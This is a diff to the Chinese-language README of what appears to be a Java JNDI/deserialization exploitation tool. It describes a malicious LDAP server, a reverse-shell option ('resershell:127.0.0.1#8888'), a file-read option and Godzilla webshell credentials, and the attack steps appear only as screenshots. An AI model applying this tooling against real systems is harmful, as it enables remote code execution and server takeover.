@@ -37,7 +37,24 @@ godzillajsp: 加密器: JAVA_AES_BASE64 密码: fine 密钥: ldapc 请求路径:
 本人拥有对此工具的修改和解释权。未经网络安全部门及相关部门允许，不得善自使用本工具进行任何攻击活动，不得以任何方式将其用于商业目的。
 该工具只授权于企业内部进行问题排查，请勿用于非法用途，请遵守网络安全法，否则后果作者概不负责
 ```
+起恶意ldap 填写端口要加载class，或者 resershell:127.0.0.1#8888 进行反弹shell（win/linux 都行），FILE:filepath 用于返回指定的字节流。
+
+生成bin
+
+![image-20240901233223069](README/image-20240901233223069.png)
+
+开启起ldap服务
+
+![image-20240901233310493](README/image-20240901233310493.png)
+
+攻击
+
+![image-20240901232757401](README/image-20240901232757401.png)
+
+**生产千万不要使用vshell(agent)**
+
 ### 原理
+
 https://unam4.github.io/2024/06/23/%E6%9F%90%E6%8A%A5%E8%A1%A8%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/
 https://unam4.github.io/2024/06/03/%E6%96%B0jdk%E5%8E%9F%E7%94%9F%E5%85%A5%E5%8F%A3%E5%88%B0jndi/
 
